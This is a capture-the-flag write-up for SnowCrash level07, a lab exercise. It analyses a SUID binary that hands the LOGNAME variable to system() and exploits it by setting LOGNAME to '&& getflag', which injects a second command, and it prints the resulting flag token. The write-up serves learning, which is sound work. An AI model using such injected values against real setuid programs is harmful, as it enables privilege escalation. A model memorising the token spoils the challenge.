# Level07: Command Injection via Environment Variable

## Overview

In this level, we encountered a SUID binary (`level07`) owned by `flag07` that was vulnerable to command injection through environment variables.

## Analysis

### Initial Examination

When we first check the binary:

```console
level07@SnowCrash:~$ ls -l
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
```

The binary has the SUID bit set (note the 's' in the permissions), meaning it runs with the privileges of its owner (`flag07`).

When executed, the binary simply outputs "level07":

```console
level07@SnowCrash:~$ ./level07
level07
```

### Binary Analysis

Analysis using a decompiler like Ghidra, which attempts to reconstruct C-like source code from the compiled binary, reveals the core vulnerable logic:

```c
  // Ghidra decompiled snippet (variable names may differ slightly)
  pcVar1 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
  iVar2 = system(local_1c);
```

This code explicitly shows that the program:

1. Retrieves the `LOGNAME` environment variable using `getenv`.
2. Formats this value into a command string `/bin/echo %s ` using `asprintf`.
3. Executes the resulting command string using `system()`.

The vulnerability lies in directly incorporating the unsanitized `LOGNAME` value into the command string passed to `system()`.

## Exploitation

The vulnerability can be exploited by modifying the `LOGNAME` environment variable to include shell commands:

```console
level07@SnowCrash:~$ export LOGNAME="&& getflag"
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

### How it works:

1. We set `LOGNAME` to `"&& getflag"`
2. When the program runs `system("/bin/echo %s", getenv("LOGNAME"))`, it effectively executes:
   ```
   system("/bin/echo && getflag")
   ```
3. In shell syntax, the `&&` operator executes the second command if the first one succeeds
4. `/bin/echo` with no arguments simply prints a newline and exits successfully
5. Then `getflag` runs with the privileges of `flag07`, giving us the token

## Security Lesson

This level demonstrates the danger of passing unsanitized user input or environment variables to functions like `system()`. Always validate and sanitize any input that could affect command execution.

## Token

```
fiumuikeil55xe9cu4dood66h
```
